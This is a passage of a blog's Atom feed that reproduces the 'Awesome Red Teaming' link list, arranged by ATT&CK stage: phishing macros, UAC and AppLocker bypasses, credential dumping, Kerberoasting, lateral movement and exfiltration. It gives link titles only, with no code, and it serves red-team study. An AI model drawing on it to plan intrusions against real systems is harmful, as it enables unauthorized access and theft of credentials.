class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"no"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;wininet.lib  cpp ä¸‹è½½&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="code" scheme="https://yaalonsong.github.io/categories/code/"/>
    
    
      <category term="code" scheme="https://yaalonsong.github.io/tags/code/"/>
    
  </entry>
  
  <entry>
    <title>Red Teaming Tools</title>
    <link href="https://yaalonsong.github.io/2019/02/28/Awesome%20Red%20Teaming.html"/>
    <id>https://yaalonsong.github.io/2019/02/28/Awesome Red Teaming.html</id>
    <published>2019-02-28T09:49:30.380Z</published>
    <updated>2019-02-28T14:44:39.779Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Awesome-Red-Teaming"><a href="#Awesome-Red-Teaming" class="headerlink" title="Awesome Red Teaming"></a>Awesome Red Teaming</h1><p>List of Awesome Red Team / Red Teaming Resources</p><p>This list is for anyone wishing to learn about Red Teaming but do not have a starting point.</p><p>Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on <a href="https://attack.mitre.org/wiki/Main_Page" target="_blank" rel="noopener">Mitre ATT&amp;CK</a></p><p>You can help by sending Pull Requests to add more information.</p><a id="more"></a><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul><li><a href="#-initial-access">Initial Access</a></li><li><a href="#-execution">Execution</a></li><li><a href="#-persistence">Persistence</a></li><li><a href="#-privilege-escalation">Privilege Escalation</a></li><li><a href="#-defense-evasion">Defense Evasion</a></li><li><a href="#-credential-access">Credential Access</a></li><li><a href="#-discovery">Discovery</a></li><li><a href="#-lateral-movement">Lateral Movement</a></li><li><a href="#-collection">Collection</a></li><li><a href="#-exfiltration">Exfiltration</a></li><li><a href="#-command-and-control">Command and Control</a></li><li><a href="#-embedded-and-peripheral-devices-hacking">Embedded and Peripheral Devices Hacking</a></li><li><a href="#-misc">Misc</a></li><li><a href="#-redteam-gadgets">RedTeam Gadgets</a></li><li><a href="#-ebooks">Ebooks</a></li><li><a href="#-training--free-">Training</a></li><li><a href="#-certification">Certification</a></li></ul><h2 id="â†‘-Initial-Access"><a href="#â†‘-Initial-Access" class="headerlink" title="â†‘ Initial Access"></a><a href="#table-of-contents">â†‘</a> Initial Access</h2><ul><li><a href="https://www.blackhillsinfosec.com/empires-cross-platform-office-macro/" target="_blank" rel="noopener">How To: Empireâ€™s Cross Platform Office Macro</a></li><li><a href="https://www.blackhillsinfosec.com/phishing-with-powerpoint/" target="_blank" rel="noopener">Phishing with PowerPoint</a></li><li><a href="https://enigma0x3.net/2016/03/15/phishing-with-empire/" target="_blank" rel="noopener">PHISHING WITH EMPIRE</a></li><li><a href="https://hakshop.com/products/bash-bunny" target="_blank" rel="noopener">Bash Bunny</a></li><li><a href="https://www.owasp.org/images/5/54/Presentation_Social_Engineering.pdf" target="_blank" rel="noopener">OWASP Presentation of Social Engineering - OWASP</a></li><li><a href="https://www.redteamsecure.com/usb-drop-attacks-the-danger-of-lost-and-found-thumb-drives/" target="_blank" rel="noopener">USB Drop Attacks: The Danger of â€œLost And Foundâ€ Thumb Drives</a></li><li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Seymour-Tully-Weaponizing-Data-Science-For-Social-Engineering-WP.pdf" target="_blank" rel="noopener">Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 23</a></li><li><a href="https://www.cobaltstrike.com/help-spear-phish" target="_blank" rel="noopener">Cobalt Strike - Spear Phishing documentation</a></li><li><a href="https://blog.cobaltstrike.com/2014/12/17/whats-the-go-to-phishing-technique-or-exploit/" target="_blank" rel="noopener">Cobalt Strike Blog - Whatâ€™s the go-to phishing technique or exploit?</a></li><li><a href="https://www.youtube.com/watch?v=V7UJjVcq2Ao" target="_blank" rel="noopener">Spear phishing with Cobalt Strike - Raphael Mudge</a></li><li><a href="https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/" target="_blank" rel="noopener">EMAIL RECONNAISSANCE AND PHISHING TEMPLATE GENERATION MADE SIMPLE</a></li><li><a href="http://www.rvrsh3ll.net/blog/phishing/phishing-for-access/" target="_blank" rel="noopener">Phishing for access</a></li><li><a href="https://4sysops.com/archives/excel-macros-with-powershell/" target="_blank" rel="noopener">Excel macros with PowerShell</a></li><li><a href="https://phishme.com/powerpoint-and-custom-actions/" target="_blank" rel="noopener">PowerPoint and Custom Actions</a></li><li><a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/" target="_blank" rel="noopener">Macro-less Code Exec in MSWord</a></li><li><a href="https://medium.com/@malcomvetter/multi-platform-macro-phishing-payloads-3b688e8eff68" target="_blank" rel="noopener">Multi-Platform Macro Phishing Payloads</a></li><li><a href="https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/" target="_blank" rel="noopener">Abusing Microsoft Word Features for Phishing: â€œsubDocâ€</a></li><li><a href="https://enigma0x3.net/2017/07/13/phishing-against-protected-view/" target="_blank" rel="noopener">Phishing Against Protected View</a></li><li><a href="https://fzuckerman.wordpress.com/2016/10/06/powershell-empire-stagers-1-phishing-with-an-office-macro-and-evading-avs/" target="_blank" rel="noopener">POWERSHELL EMPIRE STAGERS 1: PHISHING WITH AN OFFICE MACRO AND EVADING AVS</a></li><li><a href="https://www.redteamsecure.com/the-plugbot-hardware-botnet-research-project/" target="_blank" rel="noopener">The PlugBot: Hardware Botnet Research Project</a></li><li><a href="https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator" target="_blank" rel="noopener">Luckystrike: An Evil Office Document Generator</a></li><li><a href="http://georgemauer.net/2017/10/07/csv-injection.html" target="_blank" rel="noopener">The Absurdly Underestimated Dangers of CSV Injection</a></li><li><a href="https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/amp/" target="_blank" rel="noopener">Macroless DOC malware that avoids detection with Yara rule</a></li><li><a href="https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279" target="_blank" rel="noopener">Phishing between the app whitelists</a></li><li><a href="https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/" target="_blank" rel="noopener">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2)</a></li><li><a href="https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/" target="_blank" rel="noopener">Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2)</a></li><li><a href="https://www.social-engineer.org/" target="_blank" rel="noopener">Social Engineer Portal</a></li><li><a href="http://www.darkreading.com/the-7-best-social-engineering-attacks-ever/d/d-id/1319411" target="_blank" rel="noopener">7 Best social Engineering attack</a></li><li><a href="https://www.rsaconference.com/writable/presentations/file_upload/das-301_williams_rader.pdf" target="_blank" rel="noopener">Using Social Engineering Tactics For Big Data Espionage - RSA Conference Europe 2012</a></li><li><a href="https://1337red.wordpress.com/using-the-dde-attack-with-powershell-empire/" target="_blank" rel="noopener">USING THE DDE ATTACK WITH POWERSHELL EMPIRE</a></li><li><a href="https://www.kitploit.com/2018/02/pot-phishing-on-twitter.html" target="_blank" rel="noopener">Phishing on Twitter - POT</a></li><li><a href="https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/" target="_blank" rel="noopener">Microsoft Office â€“ NTLM Hashes via Frameset</a></li><li><a href="https://oddvar.moe/2017/09/13/defense-in-depth-writeup/" target="_blank" rel="noopener">Defense-In-Depth write-up</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/05/07/Phishing.html" target="_blank" rel="noopener">Spear Phishing 101</a></li></ul><h2 id="â†‘-Execution"><a href="#â†‘-Execution" class="headerlink" title="â†‘ Execution"></a><a href="#table-of-contents">â†‘</a> Execution</h2><ul><li><a href="https://msitpros.com/?p=3960" target="_blank" rel="noopener">Research on CMSTP.exe,</a></li><li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/" target="_blank" rel="noopener">Windows oneliners to download remote payload and execute arbitrary code</a></li><li><a href="https://bohops.com/2017/12/02/clickonce-twice-or-thrice-a-technique-for-social-engineering-and-untrusted-command-execution/" target="_blank" rel="noopener">Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts</a></li><li><a href="https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd" target="_blank" rel="noopener">WSH Injection: A Case Study</a></li><li><a href="http://lockboxx.blogspot.com/2018/02/intro-to-using-gscript-for-red-teams.html" target="_blank" rel="noopener">Gscript Dropper</a></li></ul><h2 id="â†‘-Persistence"><a href="#â†‘-Persistence" class="headerlink" title="â†‘ Persistence"></a><a href="#table-of-contents">â†‘</a> Persistence</h2><ul><li><a href="https://rastamouse.me/2018/03/a-view-of-persistence/" target="_blank" rel="noopener">A View of Persistence</a></li><li><a href="https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353" target="_blank" rel="noopener">hiding registry keys with psreflect</a></li><li><a href="https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/" target="_blank" rel="noopener">Persistence using RunOnceEx â€“ Hidden from Autoruns.exe</a></li><li><a href="https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/" target="_blank" rel="noopener">Persistence using GlobalFlags in Image File Execution Options â€“ Hidden from Autoruns.exe</a></li><li><a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/" target="_blank" rel="noopener">Putting data in Alternate data streams and how to execute it â€“ part 2</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/01/20/WMI-Persistence.html" target="_blank" rel="noopener">WMI Persistence with Cobalt Strike</a></li><li><a href="https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/" target="_blank" rel="noopener">Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence</a></li><li><a href="https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/" target="_blank" rel="noopener">Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence (Part 2)</a></li><li><a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/" target="_blank" rel="noopener">Vshadow: Abusing the Volume Shadow Service for Evasion, Persistence, and Active Directory Database Extraction</a></li></ul><h2 id="â†‘-Privilege-Escalation"><a href="#â†‘-Privilege-Escalation" class="headerlink" title="â†‘ Privilege Escalation"></a><a href="#table-of-contents">â†‘</a> Privilege Escalation</h2><h3 id="User-Account-Control-Bypass"><a href="#User-Account-Control-Bypass" class="headerlink" title="User Account Control Bypass"></a>User Account Control Bypass</h3><ul><li><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" target="_blank" rel="noopener">First entry: Welcome and fileless UAC bypass,</a></li><li><a href="https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html" target="_blank" rel="noopener">Exploiting Environment Variables in Scheduled Tasks for UAC Bypass,</a></li><li>Reading Your Way Around UAC in 3 parts:<br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="noopener">Part 1.</a><br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html" target="_blank" rel="noopener">Part 2.</a><br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html" target="_blank" rel="noopener">Part 3.</a></li><li><a href="https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/" target="_blank" rel="noopener">Bypassing UAC using App Paths,</a></li><li><a href="https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/" target="_blank" rel="noopener">â€œFilelessâ€ UAC Bypass using sdclt.exe,</a></li><li><a href="https://habrahabr.ru/company/pm/blog/328008/" target="_blank" rel="noopener">UAC Bypass or story about three escalations,</a></li><li><a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" target="_blank" rel="noopener">â€œFilelessâ€ UAC Bypass Using eventvwr.exe and Registry Hijacking,</a></li><li><a href="https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/" target="_blank" rel="noopener">Bypassing UAC on Windows 10 using Disk Cleanup,</a></li><li><a href="http://www.freebuf.com/articles/system/116611.html" target="_blank" rel="noopener">Using IARPUninstallStringLauncher COM interface to bypass UAC,</a></li><li><a href="https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3" target="_blank" rel="noopener">Fileless UAC Bypass using sdclt</a></li><li><a href="https://www.mdsec.co.uk/2016/12/cna-eventvwr-uac-bypass/" target="_blank" rel="noopener">Eventvwr File-less UAC Bypass CNA</a></li><li><a href="http://www.pretentiousname.com/misc/win7_uac_whitelist2.html" target="_blank" rel="noopener">Windows 7 UAC whitelist</a></li></ul><h3 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h3><ul><li><a href="https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md" target="_blank" rel="noopener">Windows Privilege Escalation Checklist</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/03/17/COM-Moniker-Privesc.html" target="_blank" rel="noopener">From Patch Tuesday to DA</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/" target="_blank" rel="noopener">A Path for Privilege Escalation</a></li></ul><h2 id="â†‘-Defense-Evasion"><a href="#â†‘-Defense-Evasion" class="headerlink" title="â†‘ Defense Evasion"></a><a href="#table-of-contents">â†‘</a> Defense Evasion</h2><ul><li><a href="https://github.com/tyranid/DeviceGuardBypasses" target="_blank" rel="noopener">Window 10 Device Guard Bypass</a></li><li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">App Locker ByPass List</a></li><li><a href="https://github.com/vysec/Windows-SignedBinary" target="_blank" rel="noopener">Window Signed Binary</a></li><li><a href="http://subt0x10.blogspot.sg/2017/04/bypass-application-whitelisting-script.html" target="_blank" rel="noopener">Bypass Application Whitelisting Script Protections - Regsvr32.exe &amp; COM Scriptlets (.sct files)</a></li><li><a href="http://subt0x10.blogspot.sg/2017/04/bypassing-application-whitelisting.html" target="_blank" rel="noopener">Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations</a></li><li><a href="https://bneg.io/2017/07/26/empire-without-powershell-exe/" target="_blank" rel="noopener">Empire without powershell</a></li><li><a href="https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/" target="_blank" rel="noopener">Powershell without Powershell to bypass app whitelist</a></li><li><a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">MS Signed mimikatz in just 3 steps</a></li><li><a href="https://riscybusiness.wordpress.com/2017/10/07/hiding-your-process-from-sysinternals/" target="_blank" rel="noopener">Hiding your process from sysinternals</a></li><li><a href="https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec" target="_blank" rel="noopener">code signing certificate cloning attacks and defenses</a></li><li><a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565" target="_blank" rel="noopener">userland api monitoring and code injection detection</a></li><li><a href="https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/" target="_blank" rel="noopener">In memory evasion</a></li><li><a href="https://posts.specterops.io/bypassing-amsi-via-com-server-hijacking-b8a3354d1aff" target="_blank" rel="noopener">Bypassing AMSI via COM Server Hijacking</a></li><li><a href="https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/" target="_blank" rel="noopener">process doppelganging</a></li><li><a href="http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html" target="_blank" rel="noopener">Week of Evading Microsoft ATA - Announcement and Day 1 to Day 5</a></li><li><a href="https://cybersyndicates.com/2015/06/veil-evasion-aes-encrypted-httpkey-request-module/" target="_blank" rel="noopener">VEIL-EVASION AES ENCRYPTED HTTPKEY REQUEST: SAND-BOX EVASION</a></li><li><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/" target="_blank" rel="noopener">Putting data in Alternate data streams and how to execute it</a></li><li><a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/" target="_blank" rel="noopener">AppLocker â€“ Case study â€“ How insecure is it really? â€“ Part 1</a></li><li><a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/" target="_blank" rel="noopener">AppLocker â€“ Case study â€“ How insecure is it really? â€“ Part 2</a></li><li><a href="https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/" target="_blank" rel="noopener">Harden Windows with AppLocker â€“ based on Case study part 2</a></li><li><a href="https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/" target="_blank" rel="noopener">Harden Windows with AppLocker â€“ based on Case study part 2</a></li><li><a href="https://oddvar.moe/2018/01/03/office-365-safe-links-bypass/" target="_blank" rel="noopener">Office 365 Safe links bypass</a></li><li><a href="https://oddvar.moe/2018/03/15/windows-defender-attack-surface-reduction-rules-bypass/" target="_blank" rel="noopener">Windows Defender Attack Surface Reduction Rules bypass</a></li><li><a href="https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/" target="_blank" rel="noopener">Bypassing Device guard UMCI using CHM â€“ CVE-2017-8625</a></li><li><a href="https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/" target="_blank" rel="noopener">Bypassing Application Whitelisting with BGInfo</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/01/10/cloning-captive-portals.html" target="_blank" rel="noopener">Cloning and Hosting Evil Captive Portals using a Wifi PineApple</a></li><li><a href="https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/" target="_blank" rel="noopener">https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/</a></li><li><a href="https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/" target="_blank" rel="noopener">Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts</a></li><li><a href="https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e" target="_blank" rel="noopener">mavinject.exe Functionality Deconstructed</a></li></ul><h2 id="â†‘-Credential-Access"><a href="#â†‘-Credential-Access" class="headerlink" title="â†‘ Credential Access"></a><a href="#table-of-contents">â†‘</a> Credential Access</h2><ul><li><a href="https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/" target="_blank" rel="noopener">Windows Access Tokens and Alternate credentials</a></li><li><a href="https://sensepost.com/blog/2016/bringing-the-hashes-home-with-regeorg-empire/" target="_blank" rel="noopener">Bringing the hashes home with reGeorg &amp; Empire</a></li><li><a href="https://sensepost.com/blog/2016/intercepting-passwords-with-empire-and-winning/" target="_blank" rel="noopener">Intercepting passwords with Empire and winning</a></li><li><a href="https://rastamouse.me/2018/03/laps---part-1/" target="_blank" rel="noopener">Local Administrator Password Solution (LAPS) Part 1</a></li><li><a href="https://rastamouse.me/2018/03/laps---part-2/" target="_blank" rel="noopener">Local Administrator Password Solution (LAPS) Part 2</a></li><li><a href="https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/" target="_blank" rel="noopener">USING A SCF FILE TO GATHER HASHES</a></li><li><a href="https://www.harmj0y.net/blog/" target="_blank" rel="noopener">Remote Hash Extraction On Demand Via Host Security Descriptor Modification</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/offensive-encrypted-data-storage/" target="_blank" rel="noopener">Offensive Encrypted Data Storage</a></li><li><a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" target="_blank" rel="noopener">Practical guide to NTLM Relaying</a></li><li><a href="https://adsecurity.org/?p=2053" target="_blank" rel="noopener">Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync</a></li><li><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">Dumping Domain Password Hashes</a></li></ul><h2 id="â†‘-Discovery"><a href="#â†‘-Discovery" class="headerlink" title="â†‘ Discovery"></a><a href="#table-of-contents">â†‘</a> Discovery</h2><ul><li><a href="https://www.owasp.org/images/4/4b/Red_Team_Operating_in_a_Modern_Environment.pdf" target="_blank" rel="noopener">Red Team Operating in a Modern Environment</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/" target="_blank" rel="noopener">My First Go with BloodHound</a></li><li><a href="https://wald0.com/?p=68" target="_blank" rel="noopener">Introducing BloodHound</a></li><li><a href="https://wald0.com/?p=179" target="_blank" rel="noopener">A Red Teamerâ€™s Guide to GPOs and OUs</a></li><li><a href="https://wald0.com/?p=14" target="_blank" rel="noopener">Automated Derivative Administrator Search</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/" target="_blank" rel="noopener">A Pentesterâ€™s Guide to Group Scoping</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/local-group-enumeration/" target="_blank" rel="noopener">Local Group Enumeration</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/" target="_blank" rel="noopener">The PowerView PowerUsage Series #1 - Mass User Profile Enumeration</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-2/" target="_blank" rel="noopener">The PowerView PowerUsage Series #2 â€“ Mapping Computer Shortnames With the Global Catalog</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/" target="_blank" rel="noopener">The PowerView PowerUsage Series #3 â€“ Enumerating GPO edit rights in a foreign domain</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/" target="_blank" rel="noopener">The PowerView PowerUsage Series #4 â€“ Finding cross-trust ACEs</a></li><li><a href="http://threat.tevora.com/aggressor-powerview/" target="_blank" rel="noopener">Aggressor PowerView</a></li><li><a href="http://threat.tevora.com/lay-of-the-land-with-bloodhound/" target="_blank" rel="noopener">Lay of the Land with BloodHound</a></li><li><a href="https://adsecurity.org/?p=3658" target="_blank" rel="noopener">Scanning for Active Directory Privileges &amp; Privileged Accounts</a></li><li><a href="https://adsecurity.org/?p=3164" target="_blank" rel="noopener">Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon</a></li><li><a href="https://bohops.com/2017/12/02/trust-direction-an-enabler-for-active-directory-enumeration-and-trust-exploitation/" target="_blank" rel="noopener">Trust Direction: An Enabler for Active Directory Enumeration and Trust Exploitation</a></li><li><a href="https://pentestlab.blog/2018/06/04/spn-discovery/" target="_blank" rel="noopener">SPN Discovery</a></li></ul><h2 id="â†‘-Lateral-Movement"><a href="#â†‘-Lateral-Movement" class="headerlink" title="â†‘ Lateral Movement"></a><a href="#table-of-contents">â†‘</a> Lateral Movement</h2><ul><li><a href="https://rastamouse.me/2017/05/a-citrix-story/" target="_blank" rel="noopener">A Citrx Story</a></li><li><a href="https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/" target="_blank" rel="noopener">Jumping Network Segregation with RDP</a></li><li><a href="http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/" target="_blank" rel="noopener">Pass hash pass ticket no pain</a></li><li><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" target="_blank" rel="noopener">Abusing DNSAdmins privilege for escalation in Active Directory</a></li><li><a href="http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html" target="_blank" rel="noopener">Using SQL Server for attacking a Forest Trust</a></li><li><a href="https://www.youtube.com/watch?v=Pn7GWRXfgeI" target="_blank" rel="noopener">Extending BloodHound for Red Teamers</a></li><li><a href="https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/" target="_blank" rel="noopener">OPSEC Considerations for beacon commands</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/" target="_blank" rel="noopener">My First Go with BloodHound</a></li><li><a href="http://www.exumbraops.com/blog/2016/6/1/kerberos-party-tricks-weaponizing-kerberos-protocol-flaws" target="_blank" rel="noopener">Kerberos Party Tricks: Weaponizing Kerberos Protocol Flaws</a></li><li><a href="https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/" target="_blank" rel="noopener">Lateral movement using excel application and dcom</a></li><li><a href="http://threat.tevora.com/lay-of-the-land-with-bloodhound/" target="_blank" rel="noopener">Lay of the Land with BloodHound</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/" target="_blank" rel="noopener">The Most Dangerous User Right You (Probably) Have Never Heard Of</a></li><li><a href="https://blog.cobaltstrike.com/2016/11/03/agentless-post-exploitation/" target="_blank" rel="noopener">Agentless Post Exploitation</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/" target="_blank" rel="noopener">A Guide to Attacking Domain Trusts</a>   </li><li><a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" target="_blank" rel="noopener">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/" target="_blank" rel="noopener">Targeted Kerberoasting</a></li><li><a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">Kerberoasting Without Mimikatz</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" target="_blank" rel="noopener">Abusing GPO Permissions</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/" target="_blank" rel="noopener">Abusing Active Directory Permissions with PowerView</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/" target="_blank" rel="noopener">Roasting AS-REPs</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">Getting the goods with CrackMapExec: Part 1</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html" target="_blank" rel="noopener">Getting the goods with CrackMapExec: Part 2</a></li><li><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/" target="_blank" rel="noopener">DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction</a></li><li><a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/" target="_blank" rel="noopener">Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement</a></li><li><a href="https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944" target="_blank" rel="noopener">a guide to attacking domain trusts</a></li><li><a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/" target="_blank" rel="noopener">Outlook Home Page â€“ Another Ruler Vector</a></li><li><a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/" target="_blank" rel="noopener">Outlook Forms and Shells</a></li><li><a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/" target="_blank" rel="noopener">Abusing the COM Registry Structure: CLSID, LocalServer32, &amp; InprocServer32</a></li><li><a href="https://codewhitesec.blogspot.com/2018/07/lethalhta.html" target="_blank" rel="noopener">LethalHTA - A new lateral movement technique using DCOM and HTA</a></li><li><a href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/" target="_blank" rel="noopener">Abusing DCOM For Yet Another Lateral Movement Technique</a></li></ul><h2 id="â†‘-Collection"><a href="#â†‘-Collection" class="headerlink" title="â†‘ Collection"></a><a href="#table-of-contents">â†‘</a> Collection</h2><ul><li><a href="https://oddvar.moe/2017/01/24/accessing-clipboard-from-the-lock-screen-in-windows-10/" target="_blank" rel="noopener">Accessing clipboard from the lock screen in Windows 10 Part 1</a></li><li><a href="https://oddvar.moe/2017/01/27/access-clipboard-from-lock-screen-in-windows-10-2/" target="_blank" rel="noopener">Accessing clipboard from the lock screen in Windows 10 Part 2</a></li></ul><h2 id="â†‘-Exfiltration"><a href="#â†‘-Exfiltration" class="headerlink" title="â†‘ Exfiltration"></a><a href="#table-of-contents">â†‘</a> Exfiltration</h2><ul><li><a href="https://blog.fosec.vn/dns-data-exfiltration-what-is-this-and-how-to-use-2f6c69998822" target="_blank" rel="noopener">DNS Data exfiltrationâ€Šâ€”â€ŠWhat is this and How to use?</a></li><li><a href="http://resources.infosecinstitute.com/dns-tunnelling/" target="_blank" rel="noopener">DNS Tunnelling</a></li><li><a 